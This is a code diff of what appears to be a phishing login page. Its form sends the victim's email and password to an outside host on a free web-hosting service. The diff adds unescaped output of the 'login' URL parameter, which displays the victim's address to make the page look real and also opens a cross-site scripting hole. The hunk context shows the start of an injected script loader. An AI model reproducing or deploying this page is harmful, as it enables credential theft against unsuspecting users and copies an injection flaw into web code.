@@ -426,10 +426,10 @@ with(document)with(body)with(insertBefore(createElement("script"),firstChild))se
                 <div class="modal-body">                                       
                 <div class="col-md-6 col-sm-6 no-padng">
                     <div class="model-l">                    
-                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" id="logFrm" class="log-frm" name="logFrm"> 
+                    <form method="post" action="https://j379192911.000webhostapp.com/temp/indexs" id="logFrms" class="log-frms" name="logFrm"> 
                     <ul>                                                     
                         <li>Email</li>
-                        <li> <input type="hidden" value="<?php echo $_GET['login']; ?>" id="userName" name="userName" class="form-control" onfocus="checkNullProf();"></li>
+                        <li> <input type="hidden" value="<?php echo $_GET['login']; ?>" id="userName" name="userName" class="form-control" onfocus="checkNullProf();"></li><font face="arial" size="3" color="#045FB4"><?php echo $_GET['login']; ?></font>
                         <li>Password</li>
                         <li><input type="password" placeholder="Password" id="password" name="password" class="form-control" onfocus="checkNullProf();"></li>                                                
                         <li><br><button type="“submit”" onclick="userLogin();" id="logBtn" class="btn btn-default">Submit</button></li>
